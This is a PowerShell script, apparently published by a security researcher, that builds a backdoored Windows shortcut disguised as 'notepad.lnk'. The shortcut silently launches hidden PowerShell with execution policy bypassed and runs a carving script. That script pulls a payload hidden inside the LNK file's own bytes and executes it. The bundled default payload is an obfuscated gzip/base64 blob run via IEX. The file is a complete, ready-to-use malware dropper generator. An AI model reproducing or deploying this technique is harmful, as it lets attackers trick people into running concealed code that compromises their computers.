#
# Create backdoored LNK file - by Felix Weyne
# Info: https://www.uperesia.com/booby-trapped-shortcut
# -Usage: place your powershell payload in $payloadContents
# -This payload can embed for instance an executable that needs
# -to be dropped to disk/loaded into memory
#

$shortcutName = "notepad.lnk"
$shortcutOutputPath = "$Home\Desktop\"+$shortcutName
$shortcutFallbackExecutionFolder="`$env:temp"
$payloadContents =
@'
notepad.exe;powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIACXS+lgCA51WXW/bNhR996+48LRaQizC9tp1CJBiqZJuAdLWqLzlwTAQmrqOtcikR1L+QOL/XlKiLDlO0GV6sUVennvuuR/UTzAUa5SznEMINzLVGjlMt/DR/IxyyVHCG7igK4Q/qUy2rZaxZDoVHP5AHd7glGUpcg2thxaYx1szOIMvuA6/Tv9BpiEcbZf4hS7QLGpi7KPCvjImfym8wBnNMx1JTMxOSjNlIDwtc9xbDaXYbMkTC7PeWKlsW7ua4rIKrfUAxf6QSrrwy//jWMuU3028SCwWlCfdw9VYZUzwJ4sXYs0zQZNiNXCYUjBUCpwAC5HkGVqCv/sBlCbpDPzKDYT4L7SnKU/aQbFZnivOZqky8hvJz4zLrfm/IFa1WLB71IqM2PLaWUx+6Q/eDo5PEqWp1Naxc13suhydNezOGcOlNohlPvySy+4lvhJXKBUeU95DN3L+HPVo6By1374j738jv/ZI/32/3S3icM5bpYJKS6QLy7YEJ6bS4mLNsKz5lQkq6dliabt8NMgplcUV2Av8kOWm6Lckrkx957/rzUxVYdd/8EYGfQchVTA+OPMNF0JjhFKns5RRjX/TLE2oLb2IZtmUsvtJEDxDh5znem7r1h46V88qEzTyVytSR9SUbDzdahxPJp79taXXI2TQM8/jzw+9nVMVeVJt+2ONG02QM5HYuj49PY+jq6vAKv3R2vjtG1OgYq3K6RDPMctA5pwbazA65MoUaRtOwEO+OrVv3Lb4iVkzKdlvMLFY5rrevOWRWG5lejfX4EcBDHr9d/A5ZVIoMdMQCbkUstCPwLn1aC0VSDQOVpiQW37LXQk6TYgdWejX0XV73fqFXCO/0/Nm1VQd3Kybo7J5nVTjkwlcG0irjet+suf5eq7VqU9CXlI2N5xLUEj5frrUVjVt+/gHQzkgVbTl/KqQgscrvhL3GF5ulkZbZfTeo+wOW/FVSnSGMXRMngsW14IVmQzIkOq5We186Pzv1K3naYa+76VFD5THvyFN/LLiu9DrgndwLoCQI/SOcntp6WMyMqG8dFG58WBNSBHipQu5RjFNTi2VBpqbUoXMVTjgpcGTsjIzwWp5lAAIq3lbgg8+vOnDI3zNdViigpPiAGoAhSAVsBH5BymATg2ysUQ8lFLIcW9y4KzButgnLEMq/eA5BmfNF9P4m9ZxJ/2n8qlhftg6zVI5apzqzKcsV/P9HezGoLtSokwodPHUl2KsxbK6Cc13RGv//bBPjrsHIXS3jx0g3wGNfeTZQwkAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadContents)
$payload = [Convert]::ToBase64String($bytes)

function Convert-ByteArrayToHexString($inputByteArray)
{
    $String = [System.BitConverter]::ToString($inputByteArray)
    $String = $String -replace "\-",""
    $String
}

function Convert-HexStringToByteArray ($hexString) {
    $hexString = $hexString.ToLower()
    ,@($hexString -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}})
}

function CreateShortcut($payloadStart,$payloadSize) {

#<------>
#<Part 1: encode carving script>
#<------>

#$stP = startPayload, $siP = sizePayload,
#$scB = scriptblock, $lnk = filestream LNK file
#$b64 = base64 encoded scriptblok, $f=shortcut name
$carvingScript = @'
$stP,$siP={0},{1};
$f='{2}';
if(-not(Test-Path $f)){{
$x=Get-ChildItem -Path {3} -Filter $f -Recurse;
[IO.Directory]::SetCurrentDirectory($x.DirectoryName);
}}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
'@ -f $payloadStart,$payloadSize,$shortcutName,$shortcutFallbackExecutionFolder
    write-host "Generated carvingscript:" -foregroundcolor "yellow"
    echo $carvingScript;
    $compressedCarvingScript = $carvingScript -replace "`n",''  -replace "`r",''

    # Convert string to base64 encoded command
    $bytes = [System.Text.Encoding]::ASCII.GetBytes( $compressedCarvingScript  )
    $encodedCommand = [Convert]::ToBase64String($bytes)

   
    #<------>
    #<Part 2: create shortcut with encoded carving script>
    #<------>

    $WshShell = New-Object -comObject WScript.Shell

    $Shortcut = $WshShell.CreateShortcut($shortcutOutputPath)
    $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    $Shortcut.Arguments = "-win hidden -Ep ByPass `$r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('$encodedCommand')); iex `$r;"
    $Shortcut.IconLocation = "C:\Windows\system32\SHELL32.dll, 1"
    $Shortcut.Save()
}

#<------>
#<Part 3: find start of embedded payload (start of computer hostname)>
#<------>
write-host "Creating LNK with payload. This will enable us to see where the payload starts" -foregroundcolor "green"
$payloadSize = $payload.Length
CreateShortcut 9999 $payloadSize

$enc = [system.Text.Encoding]::UTF8
[string]$computerName = $ENV:COMPUTERNAME
$computerNameBytes = $enc.GetBytes($computerName.ToLower())

$readin = [System.IO.File]::ReadAllBytes($shortcutOutputPath);
$contentsLnkFile = (Convert-ByteArrayToHexString $readin) -join ''
$computerNameInHex = (Convert-ByteArrayToHexString $computerNameBytes) -join ''

$startPayload = ($contentsLnkFile.IndexOf($computerNameInHex)) / 2
write-host "Start of payload in LNK file is at byte: #"$startPayload -foregroundcolor "green"

#<------>
#<Part 3: create new link with correct start of payload
#<------>
Remove-Item $shortcutOutputPath

CreateShortcut $startPayload $payloadSize
write-host "Output LNK file: "  $shortcutOutputPath -foregroundcolor "Cyan"


#<------>
#<Part 4: embed payload
#<------>
$payloadBytes = $enc.GetBytes($payload)
$payloadInHex = Convert-ByteArrayToHexString $payloadBytes
$readin = [System.IO.File]::ReadAllBytes($shortcutOutputPath);
$contentsLnkFile = (Convert-ByteArrayToHexString $readin) -join ''
$contentsLnkFile = $contentsLnkFile -replace $computerNameInHex,$payloadInHex;

$writeout = Convert-HexStringToByteArray $contentsLnkFile;
set-content -value $writeout -encoding byte -path $shortcutOutputPath;